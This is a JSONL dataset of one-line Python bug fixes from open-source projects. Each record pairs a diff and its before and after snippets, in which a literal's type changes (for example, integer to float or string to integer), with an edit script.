{"project": "robot_dashboard", "commit_sha": "be9a92f8cbc64122e59cf3d65bd1ab6a98eb16be", "parent_sha": "539e3df846926499bebe5967f45bdb863e0d0368", "file_path": "src/robot_dashboard/widgets.py", "project_url": "https://github.com/zklapow/robot_dashboard", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -424,7 +424,7 @@ class BatteryDashWidget(IconToolButton):\n-        state = round(val/20)\n+        state = round(val/20.0)\n         self.update_state(state)\n \n     def _update_state(self, state):\n", "before": "state = round ( val / 20 )", "after": "state = round ( val / 20.0 )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 0, 23, 0, 29], [\"float:20.0\", \"T\"], 2], [\"Delete\", [\"integer:20\", 0, 27, 0, 29]]]"}
{"project": "rethinkdb-python", "commit_sha": "ccb476bee00a190ef9c2e7b26fb5cf1b0a579a11", "parent_sha": "7af2c794d6030c3998310d0c7f010857463af806", "file_path": "tests/test_net.py", "project_url": "https://github.com/tommilligan/rethinkdb-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -11,7 +11,7 @@ class TestMakeConnection(object):\n         self.conn_type.return_value.reconnect.return_value = self.reconnect\n \n         self.host = \"myhost\"\n-        self.port = \"1234\"\n+        self.port = 1234\n         self.db = \"mydb\"\n         self.auth_key = None\n         self.user = \"gabor\"\n", "before": "self . port = \"1234\"", "after": "self . port = 1234", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 27], [\"integer:1234\", \"T\"], 2], [\"Delete\", [\"string:\\\"1234\\\"\", 3, 21, 3, 27]]]"}
{"project": "pytorch", "commit_sha": "0cb5943be8e1581f0ee2b2a76d0b8eec81757654", "parent_sha": "fb593d5f28cf0b777c01fa9a6cbf095dd42a0ac5", "file_path": "torch/cuda/nccl.py", "project_url": "https://github.com/victorwins/pytorch", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -196,7 +196,7 @@ def all_gather(inputs, outputs):\n \n \n def reduce_scatter(inputs, outputs, op=SUM):\n-    _check_inputs(inputs, outputs, 1/len(inputs))\n+    _check_inputs(inputs, outputs, 1.0/len(inputs))\n     comm = communicator(inputs, outputs)\n     count = inputs[0].numel() // len(inputs)\n     data_type = nccl_types[inputs[0].type()]\n", "before": "_check_inputs ( inputs , outputs , 1 / len ( inputs ) )", "after": "_check_inputs ( inputs , outputs , 1.0 / len ( inputs ) )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 36, 3, 49], [\"float:1.0\", \"T\"], 0], [\"Delete\", [\"integer:1\", 3, 36, 3, 37]]]"}
{"project": "nibabel", "commit_sha": "024e190e2e4e4bb074969a1de06aa827896abe0e", "parent_sha": "ae912c3f66f6d634836bbb433d2fd00e2454f684", "file_path": "nibabel/freesurfer/mghformat.py", "project_url": "https://github.com/MarcCote/nibabel", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -549,7 +549,7 @@ class MGHImage(SpatialImage):\n         # for more information, go through save_mgh.m in FreeSurfer dist\n         voxelsize = voxel_sizes(self._affine)\n         Mdc = self._affine[:3, :3] / voxelsize\n-        c_ras = self._affine.dot(np.vstack((shape / 2, [1])))[:3]\n+        c_ras = self._affine.dot(np.vstack((shape / 2.0, [1])))[:3]\n \n         # Assign after we've had a chance to raise exceptions\n         hdr['voxelsize'] = voxelsize\n", "before": "c_ras = self . _affine . dot ( np . vstack ( ( shape / 2 , [ 1 ] ) ) ) [ : 3 ]", "after": "c_ras = self . _affine . dot ( np . vstack ( ( shape / 2.0 , [ 1 ] ) ) ) [ : 3 ]", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 45, 3, 54], [\"float:2.0\", \"T\"], 2], [\"Delete\", [\"integer:2\", 3, 53, 3, 54]]]"}
{"project": "yt", "commit_sha": "5a5f7ba1290690b6ce061e5bbe2ff46bb3e11cb8", "parent_sha": "ae785f71c4c6966efd2b22a5f206120f7992e431", "file_path": "yt/data_objects/octree_subset.py", "project_url": "https://github.com/dpshelio/yt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -93,7 +93,7 @@ class OctreeSubset(YTSelectionContainer):\n         if len(arr.shape) == 4 and arr.flags[\"F_CONTIGUOUS\"]:\n             return arr\n         nz = self.nz\n-        n_oct = arr.shape[0] / (nz**3.0)\n+        n_oct = arr.shape[0] / (nz**3)\n         if arr.size == nz*nz*nz*n_oct:\n             new_shape = (nz, nz, nz, n_oct)\n         elif arr.size == nz*nz*nz*n_oct * 3:\n", "before": "n_oct = arr . shape [ 0 ] / ( nz ** 3.0 )", "after": "n_oct = arr . shape [ 0 ] / ( nz ** 3 )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 33, 3, 40], [\"integer:3\", \"T\"], 2], [\"Delete\", [\"float:3.0\", 3, 37, 3, 40]]]"}
{"project": "rootpy", "commit_sha": "c7ba8386097b2cee13d540dc400f52b5d1d544e1", "parent_sha": "05924ccfad787f4c866d9f57526ce911772d14fa", "file_path": "rootpy/root2hdf5.py", "project_url": "https://github.com/kreczko/rootpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -194,7 +194,7 @@ def main():\n         pass\n \n     parser = ArgumentParser(formatter_class=formatter_class)\n-    parser.add_argument('-n', '--entries', type=int, default=1E5,\n+    parser.add_argument('-n', '--entries', type=int, default=100000,\n                         help=\"number of entries to read at once\")\n     parser.add_argument('-f', '--force', action='store_true', default=False,\n                         help=\"overwrite existing output files\")\n", "before": "parser . add_argument ( '-n' , '--entries' , type = int , default = 1E5 , help = \"number of entries to read at once\" )", "after": "parser . add_argument ( '-n' , '--entries' , type = int , default = 100000 , help = \"number of entries to read at once\" )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 54, 3, 65], [\"integer:100000\", \"T\"], 2], [\"Delete\", [\"float:1E5\", 3, 62, 3, 65]]]"}
{"project": "crf_tools", "commit_sha": "cbfc350c48dc9c1b4415d9e9c602e7d02d948b3d", "parent_sha": "2d7265e3f2f1ba4232b6adf74252050db5848a3b", "file_path": "src/arsenal_crf.py", "project_url": "https://github.com/hjnhjn123/crf_tools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -56,7 +56,7 @@ def prepare_features(dfs):\n     f_sets = {name: df2set(df) for (name, df) in dfs.items() if len(df.columns) == 1}\n     f_dics = {name: df2dic(df) for (name, df) in dfs.items() if len(df.columns) == 2}\n-    f_sets_dics = {k: {i: 1 for i in j} for (k, j) in f_sets.items()}  # special case\n+    f_sets_dics = {k: {i: '1' for i in j} for (k, j) in f_sets.items()}  # special case\n     f_dics.update(f_sets_dics)\n     return OrderedDict(sorted(f_dics.items()))\n \n", "before": "f_sets_dics = { k : { i : 1 for i in j } for ( k , j ) in f_sets . items ( ) }", "after": "f_sets_dics = { k : { i : '1' for i in j } for ( k , j ) in f_sets . items ( ) }", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"pair\", 2, 24, 2, 28], [\"string:'1'\", \"T\"], 2], [\"Delete\", [\"integer:1\", 2, 27, 2, 28]]]"}
{"project": "faker", "commit_sha": "6feaa42a007fe075932025261f6f57b28fbaa3c5", "parent_sha": "d6a646389bf07f146756d34d285955b98438e011", "file_path": "faker/tests/hu_HU/__init__.py", "project_url": "https://github.com/thiagofigueiro/faker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -19,4 +19,4 @@ class hu_HU_FactoryTestCase(unittest.TestCase):\n \n         for i in range(100):\n             pcd = Provider.postcode()\n-            assert pcd[2] > 0\n+            assert pcd[2] > \"0\"\n", "before": "assert pcd [ 2 ] > 0", "after": "assert pcd [ 2 ] > \"0\"", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 20, 3, 30], [\"string:\\\"0\\\"\", \"T\"], 2], [\"Delete\", [\"integer:0\", 3, 29, 3, 30]]]"}
{"project": "gestorpsi-das", "commit_sha": "145bc9d1986d24cfe8c5b4fdfd946f96051e94b4", "parent_sha": "bda6b991e31e8d4a6579946bcc66c95c960a177f", "file_path": "gestorpsi/service/views.py", "project_url": "https://github.com/gestorpsi-das-20161/gestorpsi-das", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -101,7 +101,7 @@ def save(request, object_id = ''):\n     object.name = request.POST['service_name']\n     object.description = request.POST['service_description']\n     object.keywords = request.POST['service_keywords']\n-    if request.POST['service_active'] == True:\n+    if request.POST['service_active'] == 'True':\n         object.active = True\n     else:\n         object.active = False\n", "before": "if request . POST [ 'service_active' ] == True : object . active = True else : object . active = False", "after": "if request . POST [ 'service_active' ] == 'True' : object . active = True else : object . active = False", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 8, 3, 46], [\"string:'True'\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 42, 3, 46]]]"}
{"project": "gestorpsi-das", "commit_sha": "348dda65d9f366007e4d36adbb6846bf62452598", "parent_sha": "e3b9fd84f50541cdd7da707edafe37973b289118", "file_path": "gestorpsi/util/views.py", "project_url": "https://github.com/gestorpsi-das-20161/gestorpsi-das", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -83,5 +83,5 @@ def write_pdf(template_src, context_dict, filename='output.pdf'):\n def percentage(number, total):\n     if not total:\n         return 0\n-    return \"%.1f\" % ((int(number)*100)/int(total))\n+    return \"%.1f\" % ((int(number)*100.0)/int(total))\n \n", "before": "return \"%.1f\" % ( ( int ( number ) * 100 ) / int ( total ) )", "after": "return \"%.1f\" % ( ( int ( number ) * 100.0 ) / int ( total ) )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 23, 3, 38], [\"float:100.0\", \"T\"], 2], [\"Delete\", [\"integer:100\", 3, 35, 3, 38]]]"}
{"project": "indra", "commit_sha": "b009b295ae92027b5d517b89e7405fbffab229e1", "parent_sha": "e5db97492940fd83362bdbb1a4f9293bcf77b433", "file_path": "indra/tests/test_ontology.py", "project_url": "https://github.com/bgyori/indra", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -340,7 +340,7 @@ def test_ido_parents():\n \n def test_lspci():\n     assert bio_ontology.get_name('LSPCI', '18') == 'Pentane-1,5-Diamine'\n-    members = bio_ontology.get_children('LSPCI', 18)\n+    members = bio_ontology.get_children('LSPCI', '18')\n     # These are some of the members, not all\n     expected_members = {('CAS', '462-94-2'),\n                         ('CHEBI', 'CHEBI:18127'),\n", "before": "members = bio_ontology . get_children ( 'LSPCI' , 18 )", "after": "members = bio_ontology . get_children ( 'LSPCI' , '18' )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 40, 3, 53], [\"string:'18'\", \"T\"], 3], [\"Delete\", [\"integer:18\", 3, 50, 3, 52]]]"}
{"project": "arkc-client", "commit_sha": "d5535208028e15fd9ab6848fc5438e3f208684c9", "parent_sha": "6f84ea697dfe8c5655aabda65b4db6369c35f0c6", "file_path": "arkcclient/main.py", "project_url": "https://github.com/xyz12810/arkc-client", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -83,7 +83,7 @@ def dlmeek():\n     print(\n         \"Downloading meek plugin (meek-server) from github to your home directory.\")\n     meekfile = requests.get(link, stream=True)\n-    if meekfile.status_code == '200':\n+    if meekfile.status_code == 200:\n         print(\"Saving to \" + localfile)\n     else:\n         print(\"Error downloading.\")\n", "before": "if meekfile . status_code == '200' : print ( \"Saving to \" + localfile ) else : print ( \"Error downloading.\" )", "after": "if meekfile . status_code == 200 : print ( \"Saving to \" + localfile ) else : print ( \"Error downloading.\" )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 8, 3, 37], [\"integer:200\", \"T\"], 2], [\"Delete\", [\"string:'200'\", 3, 32, 3, 37]]]"}
{"project": "frappe", "commit_sha": "c8c442ccef9f152ff5a1ff2e24efc40dfbd5c324", "parent_sha": "f33e3e1b43c5693a33c43cea5f1aaf932915b905", "file_path": "frappe/data_migration/doctype/data_migration_run/data_migration_run.py", "project_url": "https://github.com/vjFaLk/frappe", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -149,7 +149,7 @@ class DataMigrationRun(Document):\n \t\t\t})\n \n \t\tfrappe.publish_realtime(self.trigger_name,\n-\t\t\t{\"progress_percent\": \"100\"}, user=frappe.session.user)\n+\t\t\t{\"progress_percent\": 100}, user=frappe.session.user)\n \n \tdef get_plan(self):\n \t\tif not hasattr(self, 'plan'):\n", "before": "frappe . publish_realtime ( self . trigger_name , { \"progress_percent\" : \"100\" } , user = frappe . session . user )", "after": "frappe . publish_realtime ( self . trigger_name , { \"progress_percent\" : 100 } , user = frappe . session . user )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"pair\", 3, 5, 3, 30], [\"integer:100\", \"T\"], 2], [\"Delete\", [\"string:\\\"100\\\"\", 3, 25, 3, 30]]]"}
{"project": "frappe", "commit_sha": "d7a192c8fce149959c4811487255715c9e1de151", "parent_sha": "fad0d82d0078edba74579665ab01c31793b4a503", "file_path": "frappe/utils/user.py", "project_url": "https://github.com/vjFaLk/frappe", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -160,7 +160,7 @@ class UserPermissions:\n \t\t\tdocs = frappe.get_all(\"DocType\", {'allow_import': 1})\n \t\t\tself.can_import += [doc.name for doc in docs]\n \n-\t\t\tcustomizations = frappe.get_all(\"Property Setter\", fields=['doc_type'], filters={'property': 'allow_import', 'value': 1})\n+\t\t\tcustomizations = frappe.get_all(\"Property Setter\", fields=['doc_type'], filters={'property': 'allow_import', 'value': \"1\"})\n \t\t\tself.can_import += [custom.doc_type for custom in customizations]\n \n \t\tfrappe.cache().hset(\"can_import\", frappe.session.user, self.can_import)\n", "before": "customizations = frappe . get_all ( \"Property Setter\" , fields = [ 'doc_type' ] , filters = { 'property' : 'allow_import' , 'value' : 1 } )", "after": "customizations = frappe . get_all ( \"Property Setter\" , fields = [ 'doc_type' ] , filters = { 'property' : 'allow_import' , 'value' : \"1\" } )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"pair\", 3, 113, 3, 123], [\"string:\\\"1\\\"\", \"T\"], 2], [\"Delete\", [\"integer:1\", 3, 122, 3, 123]]]"}
{"project": "summerschool2015", "commit_sha": "7015311494df6521a67259068565ddcd3271a0a2", "parent_sha": "55cf5e17e702201a18582ddad8f7c4048499ce01", "file_path": "scan_tutorial/scan_ex2_solution.py", "project_url": "https://github.com/MarvinBertin/summerschool2015", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -24,7 +24,7 @@ def set_p_to_zero(pvect, i):\n-    new_pvect = T.set_subtensor(pvect[i], 0)\n+    new_pvect = T.set_subtensor(pvect[i], 0.)\n     new_pvect = new_pvect / new_pvect.sum()\n     return new_pvect\n \n", "before": "new_pvect = T . set_subtensor ( pvect [ i ] , 0 )", "after": "new_pvect = T . set_subtensor ( pvect [ i ] , 0. )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 0, 32, 0, 45], [\"float:0.\", \"T\"], 3], [\"Delete\", [\"integer:0\", 0, 43, 0, 44]]]"}
{"project": "catplot", "commit_sha": "a4b4468b9498b32bb2b7f774f691de2ab45cc5e8", "parent_sha": "533c2b9d812504df36014df1d3d9187798cd728f", "file_path": "catplot/grid_components/edges.py", "project_url": "https://github.com/PytLab/catplot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -23,7 +23,7 @@ class GridEdge(object):\n         self.color = kwargs.pop(\"color\", \"#000000\")\n         self.width = kwargs.pop(\"width\", 1)\n         self.style = kwargs.pop(\"style\", \"solid\")\n-        self.alpha = kwargs.pop(\"alpha\", \"1\")\n+        self.alpha = kwargs.pop(\"alpha\", 1)\n         self.zorder = kwargs.pop(\"zorder\", 0)\n \n class Edge2D(GridEdge):\n", "before": "self . alpha = kwargs . pop ( \"alpha\" , \"1\" )", "after": "self . alpha = kwargs . pop ( \"alpha\" , 1 )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 32, 3, 46], [\"integer:1\", \"T\"], 3], [\"Delete\", [\"string:\\\"1\\\"\", 3, 42, 3, 45]]]"}
{"project": "mlm", "commit_sha": "9298c60321f7cccd22248c3367d3238a31c3ba3c", "parent_sha": "de0d14f9805df347a22c832e7d97b540614e9bcb", "file_path": "mlm/app/tasks.py", "project_url": "https://github.com/andreykurilin/mlm", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -96,7 +96,7 @@ class Tasks(object):\n \n         while not self.exit.isSet():\n             if not len(self.election_queue):\n-                time.sleep(\"1\")\n+                time.sleep(1)\n             else:\n                 election = self.election_queue.popleft()\n                 email_to = election.lucky_man.contacts[\"email\"]\n", "before": "time . sleep ( \"1\" )", "after": "time . sleep ( 1 )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 27, 3, 32], [\"integer:1\", \"T\"], 1], [\"Delete\", [\"string:\\\"1\\\"\", 3, 28, 3, 31]]]"}
{"project": "matplotlib", "commit_sha": "a9af4310202b234372d142de9f8e1ad460b04c33", "parent_sha": "556ec20b4f81da4b59d8075e2ac1b3784afd609b", "file_path": "lib/matplotlib/ticker.py", "project_url": "https://github.com/matwey/matplotlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1278,7 +1278,7 @@ class EngFormatter(Formatter):\n \n         pow10 = np.clip(pow10, min(self.ENG_PREFIXES), max(self.ENG_PREFIXES))\n \n-        mant = sign * dnum / (10 ** pow10)\n+        mant = sign * dnum / (10.0 ** pow10)\n         # Taking care of the cases like 999.9..., which\n         # may be rounded to 1000 instead of 1 k.\n         if (self.places is not None and\n", "before": "mant = sign * dnum / ( 10 ** pow10 )", "after": "mant = sign * dnum / ( 10.0 ** pow10 )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 31, 3, 42], [\"float:10.0\", \"T\"], 0], [\"Delete\", [\"integer:10\", 3, 31, 3, 33]]]"}
{"project": "ax3-model-extras", "commit_sha": "70a97450b0d15fdba516ddcbb30bc08bf0460394", "parent_sha": "c939d6817e68c6f1be8b7a576910d7588499bf5d", "file_path": "ax3_model_extras/webp.py", "project_url": "https://github.com/Axiacore/ax3-model-extras", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -6,7 +6,7 @@ from django.core.files.base import ContentFile\n from PIL import Image\n \n \n-def generate_webp(image_field, quality=75):\n+def generate_webp(image_field, quality='75'):\n     \"\"\"Generates a webp file. Supports PNG, JPEG and GIF files. If filepath is\n     `uploads/home/sunset.png` the generated file will be `uploads/home/sunset.webp`.\n     \"\"\"\n", "before": "def generate_webp ( image_field , quality = 75 ) : \"\"\"Generates a webp file. Supports PNG, JPEG and GIF files. If filepath is\n     `uploads/home/sunset.png` the generated file will be `uploads/home/sunset.webp`.\n     \"\"\"", "after": "def generate_webp ( image_field , quality = '75' ) : \"\"\"Generates a webp file. Supports PNG, JPEG and GIF files. If filepath is\n     `uploads/home/sunset.png` the generated file will be `uploads/home/sunset.webp`.\n     \"\"\"", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 32, 3, 42], [\"string:'75'\", \"T\"], 2], [\"Delete\", [\"integer:75\", 3, 40, 3, 42]]]"}
{"project": "webapp-improved", "commit_sha": "00220682d1f4e48b218f3ad4fdc4367624c61985", "parent_sha": "91e4a98f4fd3c9e0284426883b014f0e3361033a", "file_path": "tests/handler_test.py", "project_url": "https://github.com/tianwen2976/webapp-improved", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -420,7 +420,7 @@ The resource was found at http://localhost/somewhere; you should be redirected a\n             self.assertEqual(func('methods', _scheme='https', _full=False), 'https://localhost:80/methods')\n             self.assertEqual(func('methods', _scheme='https', _fragment='my-anchor'), 'https://localhost:80/methods#my-anchor')\n \n-            self.assertEqual(func('route-test', year='2010', month=0, name='test'), '/2010/0/test')\n+            self.assertEqual(func('route-test', year='2010', month='0', name='test'), '/2010/0/test')\n             self.assertEqual(func('route-test', year='2010', month='07', name='test'), '/2010/07/test')\n             self.assertEqual(func('route-test', year='2010', month='07', name='test', foo='bar'), '/2010/07/test?foo=bar')\n             self.assertEqual(func('route-test', _fragment='my-anchor', year='2010', month='07', name='test', foo='bar'), '/2010/07/test?foo=bar#my-anchor')\n", "before": "self . assertEqual ( func ( 'route-test' , year = '2010' , month = 0 , name = 'test' ) , '/2010/0/test' )", "after": "self . assertEqual ( func ( 'route-test' , year = '2010' , month = '0' , name = 'test' ) , '/2010/0/test' )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 62, 3, 69], [\"string:'0'\", \"T\"], 2], [\"Delete\", [\"integer:0\", 3, 68, 3, 69]]]"}
{"project": "hahaha", "commit_sha": "1cae957bff6941378286c1090811b7c92a563c04", "parent_sha": "2640e8fb5e28f0674e4b3c12b46f2f2e8335d5d2", "file_path": "networkx/linalg/algebraic_connectivity.py", "project_url": "https://github.com/tomhahaha/hahaha", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -26,7 +26,7 @@ def _tracemin_fiedler(L, tol):\n     n = L.shape[0]\n     q = 2\n     # Jacobi preconditioner.\n-    M = 1 / L.diagonal()\n+    M = 1. / L.diagonal()\n \n     Lnorm = max(asarray(abs(L).sum(axis=0))[0, :])\n \n", "before": "M = 1 / L . diagonal ( )", "after": "M = 1. / L . diagonal ( )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 9, 3, 25], [\"float:1.\", \"T\"], 0], [\"Delete\", [\"integer:1\", 3, 9, 3, 10]]]"}
{"project": "inspectors-general", "commit_sha": "35ab1eb8bcb044ef9ce310d30f4d1cc85f3cb040", "parent_sha": "22086863555e9834b330088950d5cc085cc192c8", "file_path": "inspectors/hud.py", "project_url": "https://github.com/unitedstates/inspectors-general", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -411,7 +411,7 @@ def do_canned_reports(year_range):\n     'program_area': 'Public and Indian Housing',\n     'state': 'Georgia'\n   }\n-  if '2009' in year_range:\n+  if 2009 in year_range:\n     inspector.save_report(report)\n \n utils.run(run) if (__name__ == \"__main__\") else None\n", "before": "if '2009' in year_range : inspector . save_report ( report )", "after": "if 2009 in year_range : inspector . save_report ( report )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 6, 3, 26], [\"integer:2009\", \"T\"], 0], [\"Delete\", [\"string:'2009'\", 3, 6, 3, 12]]]"}
{"project": "bgp-ranking", "commit_sha": "7401ecd6e3ab0c4f8312700d64ea91b47cfd89ac", "parent_sha": "316d3f55f9a4814efd1840ef85e3ecf696e2ee03", "file_path": "lib/db_init/make_ip_keys.py", "project_url": "https://github.com/CIRCL/bgp-ranking", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -67,7 +67,7 @@ class MakeIPKeys:\n                 break\n         if key == '':\n             if len(first_index[0]) == 0:\n-                first_index[0] = 0\n+                first_index[0] = '0'\n             hex_first = int('0x' + first_index[0], 16)\n             hex_last = int('0x' + last_index[0], 16)\n             while hex_first <= hex_last:\n", "before": "first_index [ 0 ] = 0", "after": "first_index [ 0 ] = '0'", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"assignment\", 3, 17, 3, 35], [\"string:'0'\", \"T\"], 2], [\"Delete\", [\"integer:0\", 3, 34, 3, 35]]]"}
{"project": "alpenhorn", "commit_sha": "02b53845ab8e27bb4ae6fdd29fcb71ef0d38127d", "parent_sha": "ad2d83575fd8a87127d8011e896c189c62a11bf7", "file_path": "alpenhorn/update.py", "project_url": "https://github.com/radiocosmology/alpenhorn", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -368,7 +368,7 @@ def update_node_requests(node):\n \n         # Check integrity.\n         if md5sum == req.file.md5sum:\n-            size_mb = req.file.size_b / 2 ** 20\n+            size_mb = req.file.size_b / 2**20.0\n             trans_time = et - st\n             rate = size_mb / trans_time\n             log.info(\"Pull complete (md5sum correct). Transferred %.1f MB in %i \"\n", "before": "size_mb = req . file . size_b / 2 ** 20", "after": "size_mb = req . file . size_b / 2 ** 20.0", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 41, 3, 48], [\"float:20.0\", \"T\"], 2], [\"Delete\", [\"integer:20\", 3, 46, 3, 48]]]"}
{"project": "napalm-junos", "commit_sha": "238301beeeceee43bef9c87074d2aee40e724a73", "parent_sha": "9a8207150ccbc409a9279aac35d2498d36fe8210", "file_path": "napalm_junos/junos.py", "project_url": "https://github.com/cspeidel/napalm-junos", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -145,7 +145,7 @@ class JunOSDriver(NetworkDriver):\n \n         output = self.device.facts\n \n-        uptime = 0\n+        uptime = '0'\n         if 'RE0' in output:\n             uptime = output['RE0']['up_time']\n \n", "before": "uptime = 0", "after": "uptime = '0'", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 19], [\"string:'0'\", \"T\"], 2], [\"Delete\", [\"integer:0\", 3, 18, 3, 19]]]"}
{"project": "bayesloop", "commit_sha": "876133453fa9db82cc99f7669dc0b44a9511cae9", "parent_sha": "95f5ca6a394593449b158ee953303354979d97d6", "file_path": "bayesloop/transitionModels.py", "project_url": "https://github.com/christophmark/bayesloop", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -397,7 +397,7 @@ class RegimeSwitch(TransitionModel):\n         newPrior = posterior.copy()\n-        limit = (10**self.hyperParameterValues[0])*np.prod(self.latticeConstant)  # convert prob. density to prob.\n+        limit = (10.**self.hyperParameterValues[0])*np.prod(self.latticeConstant)  # convert prob. density to prob.\n         newPrior[newPrior < limit] = limit\n \n         # transformation above violates proper normalization; re-normalization needed\n", "before": "limit = ( 10 ** self . hyperParameterValues [ 0 ] ) * np . prod ( self . latticeConstant )", "after": "limit = ( 10. ** self . hyperParameterValues [ 0 ] ) * np . prod ( self . latticeConstant )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 1, 18, 1, 50], [\"float:10.\", \"T\"], 0], [\"Delete\", [\"integer:10\", 1, 18, 1, 20]]]"}
{"project": "mutton", "commit_sha": "7dffeb96f05e7641bc53c387500ad9fd54b973e2", "parent_sha": "4bef4e4b6ccb70687a8759b61b758ac407ef44b6", "file_path": "tests/test_base_handler.py", "project_url": "https://github.com/hmngwy/mutton", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -30,7 +30,7 @@ def test_base_handler():\n     request_object = {'value': 1.0}\n     invocation = test_handler(request_object, {})\n \n-    assert invocation == '1.0'\n+    assert invocation == 1.0\n \n \n def test_base_response():\n", "before": "assert invocation == '1.0'", "after": "assert invocation == 1.0", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 31], [\"float:1.0\", \"T\"], 2], [\"Delete\", [\"string:'1.0'\", 3, 26, 3, 31]]]"}
{"project": "reinforcement-learning-car", "commit_sha": "1467d842fdc0b6c73eadff81d747fb661863dcae", "parent_sha": "a4cc7bbf99d1a1f4ad9d366488816edeb2d31f26", "file_path": "learning.py", "project_url": "https://github.com/Danielhiversen/reinforcement-learning-car", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -85,7 +85,7 @@ def train_net(model, params):\n \n         # Decrement epsilon over time.\n         if epsilon > 0.1 and t > observe:\n-            epsilon -= (1/train_frames)\n+            epsilon -= (1.0/train_frames)\n \n         # We died, so update stuff.\n         if reward == -500:\n", "before": "epsilon -= ( 1 / train_frames )", "after": "epsilon -= ( 1.0 / train_frames )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 25, 3, 39], [\"float:1.0\", \"T\"], 0], [\"Delete\", [\"integer:1\", 3, 25, 3, 26]]]"}
{"project": "pypdfocr", "commit_sha": "6ec65e973a28d058d9b879e06d44448bfd4c6056", "parent_sha": "6a333f5db5306c57f67a1e917647c5734bca015f", "file_path": "pypdfocr/pypdfocr_pdf.py", "project_url": "https://github.com/virantha/pypdfocr", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -354,5 +354,5 @@ class PyPdf(object):\n             fontname, fontsize = fontspec\n         except Exception:\n             fontname = \"\"\n-            fontsize = 8\n+            fontsize = \"8\"\n         return (fontname, self._atoi(fontsize))\n", "before": "fontsize = 8", "after": "fontsize = \"8\"", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"assignment\", 3, 13, 3, 25], [\"string:\\\"8\\\"\", \"T\"], 2], [\"Delete\", [\"integer:8\", 3, 24, 3, 25]]]"}
